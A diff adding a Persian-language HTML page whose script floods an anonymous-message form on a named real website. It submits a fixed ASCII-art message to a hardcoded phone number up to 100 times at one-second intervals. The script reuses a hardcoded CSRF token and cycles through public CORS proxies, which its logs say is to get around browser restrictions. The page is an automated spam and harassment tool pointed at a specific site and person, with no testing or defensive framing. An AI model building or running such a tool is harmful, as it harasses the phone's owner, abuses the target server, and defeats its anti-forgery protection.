@@ -1,0 +1,579 @@
+<!doctype html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دلنوشته ناشناس - ارسال خودکار</title>
+    <link rel="stylesheet" href="https://fonts.bitpin.ir/IRANYekanX/font-swap.css">
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --surface: #13131a;
+            --border: #1e1e2e;
+            --text: #e0e0e0;
+            --muted: #8888aa;
+            --gold: #d4a574;
+            --rose: #ff6b8a;
+            --green: #4ade80;
+            --red: #f87171;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'IRANYekanX', 'Courier New', monospace;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            direction: rtl;
+            color: var(--text);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 620px;
+        }
+
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 28px 24px;
+            box-shadow: 0 0 60px rgba(212, 167, 116, 0.06);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .header .icon {
+            font-size: 2.8rem;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .header h1 {
+            font-size: 1.3rem;
+            font-weight: 900;
+            margin-bottom: 4px;
+        }
+        .header h1 span {
+            color: var(--rose);
+        }
+        .header .subtitle {
+            font-size: 0.8rem;
+            color: var(--muted);
+        }
+
+        .config-panel {
+            background: #0d0d15;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        .config-panel label {
+            display: block;
+            font-size: 0.75rem;
+            color: var(--muted);
+            margin-bottom: 4px;
+            font-weight: 700;
+        }
+        .config-panel input,
+        .config-panel textarea {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            background: #0a0a12;
+            color: var(--text);
+            font-family: 'Courier New', monospace;
+            font-size: 0.75rem;
+            margin-bottom: 10px;
+            resize: vertical;
+        }
+        .config-panel textarea {
+            min-height: 100px;
+        }
+        .config-row {
+            display: flex;
+            gap: 10px;
+        }
+        .config-row>div {
+            flex: 1;
+        }
+
+        .status-panel {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+        .stat-item {
+            text-align: center;
+            background: #0d0d15;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 12px 8px;
+        }
+        .stat-value {
+            font-size: 1.6rem;
+            font-weight: 900;
+            font-family: 'Courier New', monospace;
+        }
+        .stat-value.sent {
+            color: var(--green);
+        }
+        .stat-value.remain {
+            color: var(--gold);
+        }
+        .stat-value.fail {
+            color: var(--red);
+        }
+        .stat-label {
+            font-size: 0.7rem;
+            color: var(--muted);
+            margin-top: 2px;
+        }
+
+        .progress-wrap {
+            margin-bottom: 16px;
+        }
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            color: var(--muted);
+            margin-bottom: 6px;
+        }
+        .progress-bar {
+            height: 6px;
+            background: #1a1a2e;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--rose), var(--gold));
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .log-area {
+            background: #08080f;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            color: var(--muted);
+            line-height: 1.8;
+            margin-bottom: 16px;
+            direction: ltr;
+            text-align: left;
+        }
+        .log-line {
+            padding: 2px 0;
+            border-bottom: 1px solid #ffffff05;
+        }
+        .log-line.success {
+            color: var(--green);
+        }
+        .log-line.error {
+            color: var(--red);
+        }
+        .log-line.info {
+            color: var(--gold);
+        }
+
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            flex: 1;
+            min-width: 80px;
+            padding: 12px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            font-family: inherit;
+            font-size: 0.85rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+            background: transparent;
+            color: var(--text);
+        }
+        .btn-start {
+            background: linear-gradient(135deg, #ec4899, #be185d);
+            color: white;
+            border: none;
+        }
+        .btn-start:hover {
+            box-shadow: 0 0 30px rgba(236, 72, 153, 0.3);
+        }
+        .btn-stop {
+            color: var(--red);
+            border-color: var(--red);
+        }
+        .btn-stop:hover {
+            background: rgba(248, 113, 113, 0.08);
+        }
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .btn-test {
+            color: var(--gold);
+            border-color: var(--gold);
+        }
+
+        .warning {
+            background: rgba(248, 113, 113, 0.1);
+            border: 1px solid rgba(248, 113, 113, 0.3);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 0.72rem;
+            color: var(--red);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 16px 12px;
+            }
+            .config-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .status-panel {
+                gap: 6px;
+            }
+            .stat-value {
+                font-size: 1.2rem;
+            }
+            .btn-row {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="card">
+
+            <div class="header">
+                <span class="icon">💌</span>
+                <h1>ارسال <span>خودکار</span> از بیرون سرور</h1>
+                <p class="subtitle">با پروکسی CORS - بدون نیاز به آپلود روی سرور</p>
+            </div>
+
+            <!-- هشدار -->
+            <div class="warning" id="corsWarning" style="display:none;">
+                ⚠️ خطای CORS! سرور مقصد اجازه درخواست از این اوریجین رو نمیده.
+            </div>
+
+            <!-- تنظیمات -->
+            <div class="config-panel">
+                <label>📱 شماره گیرنده:</label>
+                <input type="text" id="cfgPhone" value="09373134339" dir="ltr">
+
+                <label>📝 متن نامه:</label>
+                <textarea id="cfgMessage" dir="ltr">  ☬ SHΞЯVIN™
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠉⠉⠉⠉⠉⠉⠉⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⢀⣤⣾⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠉⠀⠀⠚⠛⠛⠛⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣀⣀⣀⣀⣀⣀⣀⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠀⠉⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⠤⠀⠉⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠉⠉⢀⣀⣤⣶⣾⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠒⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠀⣶⣶⠀⢰⣶⣶⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡀⠙⠋⢀⡀⠈⠛⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠿⣶⡶⠿⣿⣿⠶⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠀⣿⡇⠀⣿⣿⠀⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠀⣿⣇⣀⣿⣿⠀⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣶⣶⣶⠀⣶⣶⣶⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠿⠿⠿⠀⠿⠿⠿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣤⣤⣤⣤⣤⣤⣤⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠋⢀⣿⠋⢀⡀⠙⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣇⠀⢿⡏⢀⣾⡿⠀⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣤⣀⣀⣼⣇⣀⣰⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+☬  Exclusive  SHΞN™   made</textarea>
+
+                <div class="config-row">
+                    <div>
+                        <label>🔢 تعداد ارسال:</label>
+                        <input type="number" id="cfgTotal" value="100" min="1">
+                    </div>
+                    <div>
+                        <label>⏱ فاصله (میلی‌ثانیه):</label>
+                        <input type="number" id="cfgDelay" value="1000" min="100">
+                    </div>
+                </div>
+            </div>
+
+            <!-- آمار -->
+            <div class="status-panel">
+                <div class="stat-item">
+                    <div class="stat-value sent" id="sentCount">0</div>
+                    <div class="stat-label">✅ ارسال موفق</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value remain" id="remainCount">0</div>
+                    <div class="stat-label">⏳ باقی‌مانده</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value fail" id="failCount">0</div>
+                    <div class="stat-label">❌ خطا</div>
+                </div>
+            </div>
+
+            <!-- پروگرس -->
+            <div class="progress-wrap">
+                <div class="progress-info">
+                    <span>پیشرفت</span>
+                    <span id="progressPct">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <!-- لاگ -->
+            <div class="log-area" id="logArea">
+                <div class="log-line info">⏳ آماده... می‌تونی از هرجا (حتی لوکال) اجرا کنی.</div>
+            </div>
+
+            <!-- دکمه‌ها -->
+            <div class="btn-row">
+                <button class="btn btn-start" id="btnStart" onclick="startSending()">▶ شروع ارسال</button>
+                <button class="btn btn-stop" id="btnStop" onclick="stopSending()" disabled>⏹ توقف</button>
+                <button class="btn btn-test" id="btnTest" onclick="testConnection()">🔍 تست اتصال</button>
+                <button class="btn" onclick="resetAll()">🔄 بازنشانی</button>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // ═══════════════════════════════════════════
+        // ⚙️ آدرس سرور مقصد (عوض کن)
+        // ═══════════════════════════════════════════
+        const TARGET_URL = 'https://faratarazman.ir/delnoshte.php';
+        // ═══════════════════════════════════════════
+
+        // لیست پروکسی‌های CORS رایگان (به ترتیب امتحان میشن)
+        const CORS_PROXIES = [
+            (url) => 'https://corsproxy.io/?' + encodeURIComponent(url),
+            (url) => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url),
+            (url) => 'https://cors-anywhere.herokuapp.com/' + url,
+        ];
+
+        let currentProxyIndex = 0;
+        let isRunning = false;
+        let timerId = null;
+        let sentCount = 0;
+        let failCount = 0;
+
+        // DOM
+        const logArea = document.getElementById('logArea');
+        const sentEl = document.getElementById('sentCount');
+        const remainEl = document.getElementById('remainCount');
+        const failEl = document.getElementById('failCount');
+        const progressFill = document.getElementById('progressFill');
+        const progressPct = document.getElementById('progressPct');
+        const btnStart = document.getElementById('btnStart');
+        const btnStop = document.getElementById('btnStop');
+        const corsWarning = document.getElementById('corsWarning');
+
+        function getConfig() {
+            return {
+                phone: document.getElementById('cfgPhone').value.trim(),
+                message: document.getElementById('cfgMessage').value,
+                total: parseInt(document.getElementById('cfgTotal').value) || 100,
+                delay: parseInt(document.getElementById('cfgDelay').value) || 1000,
+            };
+        }
+
+        function addLog(msg, cls = 'info') {
+            const line = document.createElement('div');
+            line.className = 'log-line ' + cls;
+            const now = new Date();
+            const t = now.toLocaleTimeString('fa-IR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            line.textContent = `[${t}] ${msg}`;
+            logArea.appendChild(line);
+            logArea.scrollTop = logArea.scrollHeight;
+            if (logArea.children.length > 150) logArea.removeChild(logArea.firstChild);
+        }
+
+        function updateUI() {
+            const cfg = getConfig();
+            const done = sentCount + failCount;
+            const remain = Math.max(0, cfg.total - done);
+            const pct = cfg.total > 0 ? Math.round((done / cfg.total) * 100) : 0;
+
+            sentEl.textContent = sentCount.toLocaleString('fa-IR');
+            remainEl.textContent = remain.toLocaleString('fa-IR');
+            failEl.textContent = failCount.toLocaleString('fa-IR');
+            progressFill.style.width = pct + '%';
+            progressPct.textContent = pct + '%';
+        }
+
+        function getProxyUrl(originalUrl) {
+            return CORS_PROXIES[currentProxyIndex](originalUrl);
+        }
+
+        async function sendOne(useProxy = true) {
+            const cfg = getConfig();
+
+            const formData = new URLSearchParams();
+            formData.append('message_text', cfg.message);
+            formData.append('recipient_phone', cfg.phone);
+            formData.append('sender_name', 'SHERVIN');
+            formData.append('csrf_token', '9eba4a0f1c2251829709bd20c1869c46f3525551237ba16b1a8cfbca6a27fbf6');
+
+            const url = useProxy ? getProxyUrl(TARGET_URL) : TARGET_URL;
+            const start = Date.now();
+
+            try {
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Requested-With': 'XMLHttpRequest',
+                    },
+                    body: formData.toString(),
+                });
+
+                const elapsed = Date.now() - start;
+
+                if (resp.ok) {
+                    sentCount++;
+                    addLog(`✅ #${sentCount} OK (${elapsed}ms)`, 'success');
+                    corsWarning.style.display = 'none';
+                } else {
+                    failCount++;
+                    addLog(`⚠️ #${sentCount + failCount} HTTP ${resp.status} (${elapsed}ms)`, 'error');
+                }
+            } catch (err) {
+                failCount++;
+                addLog(`❌ #${sentCount + failCount} ${err.message}`, 'error');
+
+                // اگه پروکسی اول جواب نداد، پروکسی بعدی رو امتحان کن
+                if (useProxy && currentProxyIndex < CORS_PROXIES.length - 1) {
+                    currentProxyIndex++;
+                    addLog(`🔄 تغییر پروکسی به شماره ${currentProxyIndex + 1}...`, 'info');
+                    return sendOne(true);
+                } else if (!useProxy) {
+                    // مستقیم زدیم و fail شد = احتمالاً CORS
+                    corsWarning.style.display = 'block';
+                    addLog('💡 دارم با پروکسی امتحان می‌کنم...', 'info');
+                    currentProxyIndex = 0;
+                    return sendOne(true);
+                }
+            }
+
+            updateUI();
+            checkDone();
+        }
+
+        function checkDone() {
+            const cfg = getConfig();
+            if (sentCount + failCount >= cfg.total) {
+                stopSending();
+                addLog('🏁 همه ارسال‌ها انجام شد.', 'info');
+            }
+        }
+
+        function startSending() {
+            if (isRunning) return;
+            const cfg = getConfig();
+            if (!cfg.phone || !cfg.message) {
+                addLog('⚠️ شماره و متن نامه رو پر کن!', 'error');
+                return;
+            }
+
+            isRunning = true;
+            btnStart.disabled = true;
+            btnStop.disabled = false;
+            addLog(`🚀 شروع | هدف: ${cfg.total} | فاصله: ${cfg.delay}ms | پروکسی: فعال`, 'info');
+            addLog(`📡 مسیر: ${TARGET_URL}`, 'info');
+
+            // اولین ارسال فوری
+            sendOne(true);
+
+            // ادامه با تایمر
+            timerId = setInterval(() => {
+                if (!isRunning) return;
+                sendOne(true);
+            }, cfg.delay);
+        }
+
+        function stopSending() {
+            isRunning = false;
+            if (timerId) { clearInterval(timerId);
+                timerId = null; }
+            btnStart.disabled = false;
+            btnStop.disabled = true;
+            addLog('⏸ متوقف شد.', 'info');
+        }
+
+        function resetAll() {
+            stopSending();
+            sentCount = 0;
+            failCount = 0;
+            currentProxyIndex = 0;
+            updateUI();
+            progressFill.style.width = '0%';
+            progressPct.textContent = '0%';
+            logArea.innerHTML = '';
+            addLog('🔄 بازنشانی شد. آماده.', 'info');
+            corsWarning.style.display = 'none';
+        }
+
+        async function testConnection() {
+            addLog('🔍 تست اتصال مستقیم به سرور...', 'info');
+            try {
+                const resp = await fetch(TARGET_URL, { method: 'HEAD', mode: 'no-cors' });
+                addLog('✅ سرور در دسترسه (no-cors)', 'success');
+            } catch (e) {
+                addLog('❌ مستقیم نشد - با پروکسی تست می‌کنم...', 'error');
+                try {
+                    const resp = await fetch(getProxyUrl(TARGET_URL), { method: 'HEAD' });
+                    if (resp.ok) {
+                        addLog('✅ با پروکسی وصل شد!', 'success');
+                        corsWarning.style.display = 'block';
+                    }
+                } catch (e2) {
+                    addLog('❌ پروکسی هم جواب نداد: ' + e2.message, 'error');
+                }
+            }
+        }
+
+        // init
+        updateUI();
+        addLog('📋 آماده. از هرجا (حتی فایل لوکال) می‌تونی اجرا کنی.', 'info');
+        addLog('🌐 استفاده از پروکسی CORS برای رد شدن از محدودیت مرورگر', 'info');
+    </script>
+
+</body>
+</html>
